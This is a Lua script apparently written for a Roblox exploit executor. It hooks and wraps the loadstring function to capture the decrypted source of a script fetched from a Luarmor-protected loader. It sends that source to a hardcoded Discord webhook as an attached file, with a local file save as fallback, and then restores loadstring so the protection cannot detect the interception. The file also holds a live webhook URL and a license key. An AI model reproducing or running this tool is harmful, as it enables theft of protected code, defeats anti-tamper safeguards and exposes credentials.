--[[
  Capture source → Discord webhook. Debug + tamper check + anti-tamper (restore loadstring after capture).
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479359786561835118/h-J6cqgI66Kddz4_PlnmYq92Xn5b6BBXEAByZNzF_sf1HPLgUX4NhVkYzkdAFpbXcz8-"

local _n = 0
local _maxChunk = 3900

local function _escape(s)
	return tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")
end

local function _post(content)
	local body = "{\"content\":" .. ("%q"):format(_escape(tostring(content):sub(1, 2000))) .. "}"
	pcall(function()
		if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body }) return end
		if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
	end)
end

local function _debug(msg)
	_post("[DEBUG] " .. tostring(msg))
end

-- Tampering detection: report if loadstring/hook look clean before we touch anything.
local function _checkTamper()
	local d = debug
	local ls = loadstring
	local lsOk = false
	local hookOk = false
	pcall(function()
		if d and d.getinfo then
			local info = d.getinfo(ls, "S")
			-- Native loadstring usually has source "=[C]" or similar
			lsOk = (info and info.source and (info.source == "=[C]" or info.source:find("^=%[")))
		end
		hookOk = not not (d and d.sethook and d.getinfo and d.getlocal)
	end)
	_debug("Tamper check: loadstring=" .. (lsOk and "native" or "replaced/unknown") .. ", debug.sethook=" .. (hookOk and "yes" or "no"))
end

local function _sendHttp(body, contentType)
	contentType = contentType or "application/json"
	if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
end

local function _sendAsFile(s)
	local boundary = "----Boundary" .. tostring(math.random(100000, 999999))
	local header = "Content-Disposition: form-data; name=\"content\"\r\n\r\nCaptured source (" .. #s .. " chars) - full file attached.\r\n"
	local filePart = "Content-Disposition: form-data; name=\"file\"; filename=\"source.lua\"\r\nContent-Type: text/plain\r\n\r\n"
	local body = "--" .. boundary .. "\r\n" .. header .. "--" .. boundary .. "\r\n" .. filePart .. s .. "\r\n--" .. boundary .. "--\r\n"
	return pcall(function()
		_sendHttp(body, "multipart/form-data; boundary=" .. boundary)
	end)
end

local _real = loadstring

local function _send(s)
	if type(s) ~= "string" or #s < 600 then return end
	_n = _n + 1
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function()
			local sent = _sendAsFile(s)
			if sent then
				_post("[DEBUG] Sent full source as file (" .. #s .. " chars)")
			elseif writefile then
				pcall(function() if makefolder then makefolder("static_content_130525") end end)
				pcall(function() writefile("static_content_130525/source_captured.lua", s) end)
				_post("[DEBUG] Saved to static_content_130525/source_captured.lua (" .. #s .. " chars)")
			else
				local chunk = s:sub(1, _maxChunk)
				local body = game and game.GetService and game:GetService("HttpService") and game:GetService("HttpService"):JSONEncode({
					content = "Full source " .. #s .. " chars - file/save failed. First " .. _maxChunk .. " chars:",
					embeds = { { description = "```lua\n" .. chunk .. "\n```" } }
				}) or "{\"content\":\"Full " .. #s .. " chars - no writefile\"}"
				_sendHttp(body)
			end
			-- Anti-tamper: restore loadstring so protected script doesn't see our wrapper later
			loadstring = _real
			_debug("Restored loadstring (anti-tamper)")
		end)
	end)
end

_debug("Script started")
_checkTamper()

local _d = debug
local _useHook = _d and _d.sethook and _d.getinfo and _d.getlocal

if _useHook then
	_debug("Using debug hook, then wrapper")
	local _hookActive = true
	_d.sethook(function(ev)
		if ev ~= "call" or not _hookActive then return end
		local info = _d.getinfo(2, "f")
		if not info or not info.func then return end
		if info.func ~= _real then return end
		local _, src = _d.getlocal(2, 1)
		_debug("loadstring called len=" .. (type(src) == "string" and #src or 0) .. ", switching to wrapper")
		_hookActive = false
		_d.sethook()
		loadstring = function(src2, name)
			if type(src2) == "string" then _send(src2) end
			return _real(src2, name)
		end
	end, "c")
else
	_debug("Using loadstring wrapper")
	loadstring = function(src, name)
		if type(src) == "string" then _send(src) end
		return _real(src, name)
	end
end

_debug("Calling loader...")
local ok, err = pcall(function()
	script_key = _K
	loadstring(game:HttpGet(_U))()
end)
if not ok then
	_debug("ERROR: " .. tostring(err))
end
